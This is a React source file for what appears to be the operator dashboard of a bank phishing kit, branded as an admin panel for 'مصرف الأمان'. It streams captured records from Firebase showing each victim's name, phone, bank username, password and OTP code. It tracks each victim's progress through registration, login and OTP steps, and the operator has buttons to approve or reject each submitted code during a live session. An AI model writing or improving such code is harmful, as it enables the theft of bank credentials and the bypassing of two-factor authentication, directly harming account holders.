import { useEffect, useState } from "react";
import { subscribeToOrders, approveOrder, rejectOrder } from "@/lib/firebase";

interface Order {
  id: string;
  fullName?: string;
  phone?: string;
  username?: string;
  password?: string;
  otp?: string;
  step?: string;
  approved?: boolean | null;
  timestamp?: any;
  completedAt?: any;
  updatedAt?: any;
}

const TEAL = "#2ca5e0";
const DARK = "#1c1e22";
const DARK2 = "#232629";
const DARK3 = "#2b2d31";
const DARK4 = "#181a1d";
const BUBBLE = "#212d3b";
const BUBBLE_OUT = "#2b5278";
const GREEN = "#4caf50";

function timeAgo(ts: any): string {
  if (!ts) return "";
  const date = ts.toDate ? ts.toDate() : new Date(ts);
  const diff = Math.floor((Date.now() - date.getTime()) / 1000);
  if (diff < 60) return `${diff}ث`;
  if (diff < 3600) return `${Math.floor(diff / 60)}د`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}س`;
  return date.toLocaleDateString("ar-LY");
}

function getStep(order: Order): { label: string; color: string; icon: string } {
  switch (order.step) {
    case "otp": return { label: "مكتمل", color: GREEN, icon: "✓" };
    case "login": return { label: "تسجيل دخول", color: "#f59e0b", icon: "🔑" };
    case "registered": return { label: "تسجيل", color: TEAL, icon: "📝" };
    default: return { label: "جديد", color: "#94a3b8", icon: "•" };
  }
}

function avatarLetter(order: Order) {
  return order.fullName?.trim().charAt(0) || order.username?.trim().charAt(0) || "?";
}

function DataRow({ label, value, icon, secret }: { label: string; value?: string; icon: string; secret?: boolean }) {
  const [show, setShow] = useState(false);
  if (!value) return null;
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 0", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
      <span style={{ fontSize: 14, width: 22, textAlign: "center", flexShrink: 0 }}>{icon}</span>
      <span style={{ fontSize: 11, color: "#94a3b8", width: 80, flexShrink: 0, fontFamily: "'Cairo',sans-serif" }}>{label}</span>
      <span style={{ fontSize: 13, color: "white", flex: 1, fontFamily: secret ? "monospace" : "'Cairo',sans-serif", letterSpacing: secret && !show ? 2 : 0, wordBreak: "break-all" }}>
        {secret && !show ? "••••••••" : value}
      </span>
      {secret && (
        <button onClick={() => setShow(s => !s)} style={{ background: "none", border: "none", cursor: "pointer", color: "#94a3b8", fontSize: 11, fontFamily: "'Cairo',sans-serif", flexShrink: 0 }}>
          {show ? "إخفاء" : "إظهار"}
        </button>
      )}
    </div>
  );
}

function MessageCard({ order, index }: { order: Order; index: number }) {
  const step = getStep(order);
  const ts = order.completedAt || order.updatedAt || order.timestamp;
  const [acting, setActing] = useState(false);

  const isAwaitingApproval = order.step === "otp" && order.approved === null;
  const isApproved = order.approved === true;
  const isRejected = order.approved === false;

  const handleApprove = async () => { setActing(true); await approveOrder(order.id).catch(console.error); setActing(false); };
  const handleReject = async () => { setActing(true); await rejectOrder(order.id).catch(console.error); setActing(false); };

  return (
    <div style={{
      background: BUBBLE, borderRadius: 16, padding: "16px 18px",
      boxShadow: "0 2px 12px rgba(0,0,0,0.3)",
      animation: "ab-slide-up 0.3s ease both", animationDelay: `${Math.min(index, 10) * 0.04}s`,
      border: "1px solid rgba(255,255,255,0.05)",
    }}>
      {/* Card header */}
      <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
        <div style={{ width: 36, height: 36, borderRadius: "50%", background: `linear-gradient(135deg,${BUBBLE_OUT},${TEAL})`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 15, fontWeight: 800, color: "white", flexShrink: 0 }}>
          {avatarLetter(order)}
        </div>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ color: TEAL, fontWeight: 700, fontSize: 13, fontFamily: "'Cairo',sans-serif", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
            {order.fullName || "مجهول"}
          </div>
          <div style={{ color: "#475569", fontSize: 10, fontFamily: "monospace" }}>#{order.id.slice(-8)}</div>
        </div>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 3 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 4, background: `${step.color}20`, border: `1px solid ${step.color}40`, borderRadius: 20, padding: "2px 8px" }}>
            <span style={{ fontSize: 9 }}>{step.icon}</span>
            <span style={{ fontSize: 9, fontWeight: 700, color: step.color, fontFamily: "'Cairo',sans-serif" }}>{step.label}</span>
          </div>
          <span style={{ fontSize: 9, color: "#475569" }}>{timeAgo(ts)}</span>
        </div>
      </div>

      {/* Data rows */}
      <DataRow label="الاسم الكامل" value={order.fullName} icon="👤" />
      <DataRow label="الهاتف" value={order.phone} icon="📱" />
      <DataRow label="المستخدم" value={order.username} icon="🧑" />
      <DataRow label="كلمة المرور" value={order.password} icon="🔑" secret />
      <DataRow label="رمز OTP" value={order.otp} icon="🔐" secret />

      {/* Approval */}
      {order.step === "otp" && (
        <div style={{ marginTop: 12 }}>
          {isAwaitingApproval && (
            <div style={{ display: "flex", gap: 8 }}>
              <button disabled={acting} onClick={handleApprove}
                style={{ flex: 1, padding: "9px 0", borderRadius: 10, border: "none", background: acting ? "#1a3a1a" : "linear-gradient(135deg,#16a34a,#15803d)", color: "white", fontWeight: 800, fontSize: 13, cursor: acting ? "not-allowed" : "pointer", fontFamily: "'Cairo',sans-serif", display: "flex", alignItems: "center", justifyContent: "center", gap: 5, opacity: acting ? 0.6 : 1, transition: "all 0.2s" }}>
                {acting ? "..." : <><span>✓</span><span>قبول</span></>}
              </button>
              <button disabled={acting} onClick={handleReject}
                style={{ flex: 1, padding: "9px 0", borderRadius: 10, border: "none", background: acting ? "#3a1a1a" : "linear-gradient(135deg,#dc2626,#b91c1c)", color: "white", fontWeight: 800, fontSize: 13, cursor: acting ? "not-allowed" : "pointer", fontFamily: "'Cairo',sans-serif", display: "flex", alignItems: "center", justifyContent: "center", gap: 5, opacity: acting ? 0.6 : 1, transition: "all 0.2s" }}>
                {acting ? "..." : <><span>✕</span><span>رفض</span></>}
              </button>
            </div>
          )}
          {isApproved && (
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, padding: "9px 0", background: "rgba(22,163,74,0.15)", borderRadius: 10, border: "1px solid rgba(22,163,74,0.3)" }}>
              <span>✅</span><span style={{ color: "#4ade80", fontSize: 12, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>تمت الموافقة</span>
            </div>
          )}
          {isRejected && (
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, padding: "9px 0", background: "rgba(220,38,38,0.15)", borderRadius: 10, border: "1px solid rgba(220,38,38,0.3)" }}>
              <span>❌</span><span style={{ color: "#f87171", fontSize: 12, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>تم الرفض</span>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

/* ─── Sidebar user row ─── */
function UserRow({ order, selected, onClick }: { order: Order; selected: boolean; onClick: () => void }) {
  const step = getStep(order);
  const ts = order.completedAt || order.updatedAt || order.timestamp;
  return (
    <button onClick={onClick} style={{
      width: "100%", display: "flex", alignItems: "center", gap: 10,
      padding: "10px 14px", border: "none", cursor: "pointer", textAlign: "right",
      background: selected ? `linear-gradient(90deg,${BUBBLE_OUT}60,${TEAL}18)` : "transparent",
      borderRight: selected ? `3px solid ${TEAL}` : "3px solid transparent",
      borderLeft: "none", borderTop: "none", borderBottom: "1px solid rgba(255,255,255,0.04)",
      transition: "all 0.15s",
    }}>
      {/* Avatar */}
      <div style={{ width: 40, height: 40, borderRadius: "50%", background: selected ? `linear-gradient(135deg,${TEAL},#1a8fc2)` : `linear-gradient(135deg,${BUBBLE_OUT},#1e3a58)`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16, fontWeight: 800, color: "white", flexShrink: 0, boxShadow: selected ? `0 0 12px ${TEAL}50` : "none" }}>
        {avatarLetter(order)}
      </div>
      {/* Info */}
      <div style={{ flex: 1, minWidth: 0 }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 2 }}>
          <span style={{ color: selected ? "white" : "#cbd5e1", fontSize: 12, fontWeight: 700, fontFamily: "'Cairo',sans-serif", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", maxWidth: 110 }}>
            {order.fullName || order.username || "مجهول"}
          </span>
          <span style={{ fontSize: 9, color: "#475569", flexShrink: 0 }}>{timeAgo(ts)}</span>
        </div>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <span style={{ fontSize: 10, color: "#475569", fontFamily: "monospace" }}>{order.phone || order.id.slice(-8)}</span>
          <div style={{ width: 7, height: 7, borderRadius: "50%", background: step.color, boxShadow: `0 0 5px ${step.color}` }} />
        </div>
      </div>
    </button>
  );
}

/* ─── Main page ─── */
export default function AdminPage() {
  const [orders, setOrders] = useState<Order[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [filter, setFilter] = useState<"all" | "otp" | "login" | "registered">("all");

  useEffect(() => {
    const unsub = subscribeToOrders((data) => {
      setOrders(data);
      setLoading(false);
    });
    return () => unsub();
  }, []);

  /* Sidebar list — respect search + step filter */
  const sidebarList = orders.filter(o => {
    if (filter !== "all" && o.step !== filter) return false;
    if (!search) return true;
    const q = search.toLowerCase();
    return (
      o.fullName?.toLowerCase().includes(q) ||
      o.phone?.includes(q) ||
      o.username?.toLowerCase().includes(q) ||
      o.id.includes(q)
    );
  });

  /* Main panel — if a user is selected show only that card, else show all filtered */
  const mainList = selectedId ? orders.filter(o => o.id === selectedId) : sidebarList;

  const counts = {
    all: orders.length,
    otp: orders.filter(o => o.step === "otp").length,
    login: orders.filter(o => o.step === "login").length,
    registered: orders.filter(o => o.step === "registered").length,
  };

  const selectedOrder = selectedId ? orders.find(o => o.id === selectedId) : null;

  return (
    <div style={{ display: "flex", height: "100vh", width: "100%", background: DARK4, fontFamily: "'Cairo',sans-serif", flexDirection: "column", overflow: "hidden" }}>

      {/* ══ TOP BAR ══ */}
      <div style={{ background: DARK2, padding: "10px 20px", display: "flex", alignItems: "center", gap: 14, borderBottom: "1px solid rgba(255,255,255,0.06)", flexShrink: 0, zIndex: 10 }}>
        <div style={{ width: 40, height: 40, borderRadius: "50%", background: `linear-gradient(135deg,${TEAL},#1a8fc2)`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 18, boxShadow: `0 2px 12px ${TEAL}50` }}>
          📊
        </div>
        <div style={{ flex: 1 }}>
          <div style={{ color: "white", fontWeight: 800, fontSize: 15, fontFamily: "'Cairo',sans-serif" }}>لوحة الإدارة — مصرف الأمان</div>
          <div style={{ color: "#475569", fontSize: 11 }}>{loading ? "جارٍ التحميل..." : `${orders.length} سجل إجمالي`}</div>
        </div>
        {/* Stats pills */}
        <div style={{ display: "flex", gap: 8 }}>
          {[
            { key: "all", label: "الكل", color: "#94a3b8" },
            { key: "otp", label: "مكتمل", color: GREEN },
            { key: "login", label: "دخول", color: "#f59e0b" },
            { key: "registered", label: "تسجيل", color: TEAL },
          ].map(t => (
            <button key={t.key} onClick={() => { setFilter(t.key as any); setSelectedId(null); }}
              style={{ padding: "4px 12px", borderRadius: 20, border: `1px solid ${filter === t.key ? t.color : "rgba(255,255,255,0.08)"}`, background: filter === t.key ? `${t.color}20` : "transparent", color: filter === t.key ? t.color : "#475569", fontSize: 11, fontWeight: 700, cursor: "pointer", fontFamily: "'Cairo',sans-serif", transition: "all 0.2s" }}>
              {counts[t.key as keyof typeof counts]} {t.label}
            </button>
          ))}
        </div>
        {/* Live dot */}
        <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
          <div style={{ width: 8, height: 8, borderRadius: "50%", background: GREEN, boxShadow: `0 0 8px ${GREEN}`, animation: "ab-pulse-glow 2s infinite" }} />
          <span style={{ color: "#475569", fontSize: 11 }}>مباشر</span>
        </div>
      </div>

      {/* ══ BODY: sidebar + main ══ */}
      <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>

        {/* ── LEFT SIDEBAR ── */}
        <div style={{ width: 270, flexShrink: 0, background: DARK2, borderRight: "1px solid rgba(255,255,255,0.06)", display: "flex", flexDirection: "column", overflow: "hidden" }}>

          {/* Search */}
          <div style={{ padding: "10px 10px 8px", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
            <div style={{ position: "relative" }}>
              <span style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", fontSize: 12, color: "#475569" }}>🔍</span>
              <input value={search} onChange={e => { setSearch(e.target.value); setSelectedId(null); }}
                placeholder="بحث..." dir="rtl"
                style={{ width: "100%", padding: "7px 30px 7px 10px", background: DARK3, border: "1px solid rgba(255,255,255,0.07)", borderRadius: 10, color: "white", fontSize: 12, fontFamily: "'Cairo',sans-serif", outline: "none", boxSizing: "border-box" }} />
            </div>
          </div>

          {/* "All" row */}
          <button onClick={() => setSelectedId(null)}
            style={{ width: "100%", display: "flex", alignItems: "center", gap: 10, padding: "10px 14px", border: "none", borderBottom: "1px solid rgba(255,255,255,0.04)", cursor: "pointer", background: selectedId === null ? `${TEAL}18` : "transparent", borderRight: selectedId === null ? `3px solid ${TEAL}` : "3px solid transparent", transition: "all 0.15s" }}>
            <div style={{ width: 40, height: 40, borderRadius: "50%", background: selectedId === null ? `linear-gradient(135deg,${TEAL},#1a8fc2)` : DARK3, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16 }}>
              📋
            </div>
            <div style={{ flex: 1, textAlign: "right" }}>
              <div style={{ color: selectedId === null ? TEAL : "#94a3b8", fontSize: 12, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>جميع السجلات</div>
              <div style={{ color: "#475569", fontSize: 10 }}>{sidebarList.length} سجل</div>
            </div>
          </button>

          {/* User list */}
          <div style={{ flex: 1, overflowY: "auto" }}>
            {loading ? (
              <div style={{ display: "flex", justifyContent: "center", padding: 24 }}>
                <div style={{ width: 28, height: 28, borderRadius: "50%", border: `2px solid ${TEAL}`, borderTopColor: "transparent", animation: "ab-spin 1s linear infinite" }} />
              </div>
            ) : sidebarList.length === 0 ? (
              <div style={{ padding: 20, textAlign: "center", color: "#475569", fontSize: 12, fontFamily: "'Cairo',sans-serif" }}>لا توجد نتائج</div>
            ) : (
              sidebarList.map(order => (
                <UserRow key={order.id} order={order} selected={selectedId === order.id} onClick={() => setSelectedId(order.id)} />
              ))
            )}
          </div>
        </div>

        {/* ── MAIN CONTENT ── */}
        <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", background: DARK }}>

          {/* Panel header */}
          <div style={{ padding: "12px 20px", background: DARK3, borderBottom: "1px solid rgba(255,255,255,0.05)", display: "flex", alignItems: "center", gap: 10, flexShrink: 0 }}>
            {selectedOrder ? (
              <>
                <div style={{ width: 34, height: 34, borderRadius: "50%", background: `linear-gradient(135deg,${BUBBLE_OUT},${TEAL})`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 14, fontWeight: 800, color: "white" }}>
                  {avatarLetter(selectedOrder)}
                </div>
                <div>
                  <div style={{ color: "white", fontWeight: 700, fontSize: 13, fontFamily: "'Cairo',sans-serif" }}>{selectedOrder.fullName || selectedOrder.username || "مجهول"}</div>
                  <div style={{ color: "#475569", fontSize: 10 }}>{selectedOrder.phone || ""}</div>
                </div>
                <button onClick={() => setSelectedId(null)} style={{ marginRight: "auto", background: "rgba(255,255,255,0.06)", border: "none", borderRadius: 8, padding: "4px 12px", color: "#94a3b8", fontSize: 11, cursor: "pointer", fontFamily: "'Cairo',sans-serif" }}>
                  ← الكل
                </button>
              </>
            ) : (
              <span style={{ color: "#94a3b8", fontSize: 13, fontFamily: "'Cairo',sans-serif" }}>
                {mainList.length} سجل {filter !== "all" ? `• ${["", "مكتمل", "دخول", "تسجيل"][["all", "otp", "login", "registered"].indexOf(filter)]}` : ""}
              </span>
            )}
          </div>

          {/* Cards grid */}
          <div style={{ flex: 1, overflowY: "auto", padding: "16px 20px" }}>
            {loading ? (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", height: "100%", gap: 12 }}>
                <div style={{ width: 48, height: 48, borderRadius: "50%", border: `3px solid ${TEAL}`, borderTopColor: "transparent", animation: "ab-spin 1s linear infinite" }} />
                <span style={{ color: "#64748b", fontSize: 14 }}>جارٍ تحميل البيانات...</span>
              </div>
            ) : mainList.length === 0 ? (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", height: "100%", gap: 8 }}>
                <div style={{ fontSize: 48 }}>📭</div>
                <span style={{ color: "#475569", fontSize: 14, fontFamily: "'Cairo',sans-serif" }}>لا توجد بيانات</span>
              </div>
            ) : (
              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(340px, 1fr))", gap: 14, alignItems: "start" }}>
                {mainList.map((order, i) => (
                  <MessageCard key={order.id} order={order} index={i} />
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
